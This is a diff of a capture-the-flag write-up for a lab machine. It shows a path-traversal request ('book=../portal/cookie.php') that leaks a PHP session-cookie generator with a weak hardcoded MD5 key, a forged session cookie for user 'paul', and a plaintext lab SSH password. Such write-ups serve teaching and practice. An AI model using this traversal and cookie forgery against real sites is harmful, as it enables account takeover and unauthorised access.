@@ -100,18 +100,20 @@ Look at the response we get an idea of the folder structure.
 We are currently acting as www-data user and the bookController.php directory path. 
 
 ```html
-book=../index.php&method=1
+book=../portal/cookie.php&method=1
 ```
 
-I find a directory called portal,here we can go to login.php 
+I find a directory called portal,here we can go to cookie.php 
+```php
+<?php\\r\\n\\/\*\*\\r\\n \* @param string $username  Username requesting session cookie\\r\\n \* \\r\\n \* @return string $session\_cookie Returns the generated cookie\\r\\n \* \\r\\n \* @devteam\\r\\n \* Please DO NOT use default PHPSESSID; our security team says they are predictable.\\r\\n \* CHANGE SECOND PART OF MD5 KEY EVERY WEEK\\r\\n \* \*\\/\\r\\nfunction makesession($username){\\r\\n    $max = strlen($username) - 1;\\r\\n    $seed = rand(0, $max);\\r\\n    $key = \\"s4lTy\_stR1nG\_\\".$username\[$seed\].\\"(!528.\\/9890\\";\\r\\n    $session\_cookie = $username.md5($key);\\r\\n\\r\\n    return $session\_cookie;\\r\\n}"
 go there and create a new user.
+```
 
 
-
-
-ssh administrator@10.10.10.228  
-Password: p@ssw0rd!@#$9890./
-
+Paul phpsessid
+```php
+paul47200b180ccd6835d25d034eeb6e6390
+```
 
 
 writeups : Password: p@ssw0rd!@#$9890./
